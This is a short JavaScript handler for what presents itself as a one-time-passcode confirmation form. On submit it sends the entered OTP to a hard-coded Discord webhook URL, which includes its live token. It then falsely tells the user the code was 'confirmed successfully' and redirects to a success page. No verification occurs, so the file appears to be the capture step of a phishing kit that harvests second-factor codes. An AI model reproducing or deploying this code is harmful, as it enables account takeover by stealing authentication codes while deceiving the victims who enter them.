document.getElementById('otp-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting the default way

    // Get OTP value
    const otp = document.getElementById('otp').value.trim();

    // Check if OTP is provided
    if (!otp) {
        alert('Please enter the OTP.');
        return; // Stop the function if OTP is not provided
    }

    // Prepare data to send to the webhook
    const payload = {
        content: `OTP Confirmation:
        \nOTP: ${otp}`
    };

    // Send the OTP to the webhook
    fetch('https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            // Redirect to a confirmation or success page if needed
            alert('OTP confirmed successfully!');
            window.location.href = 'success.html'; // Redirect to a success page or another relevant page
        } else {
            alert('There was a problem with confirming the OTP. Please try again.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('There was an error processing your request. Please try again.');
    });
});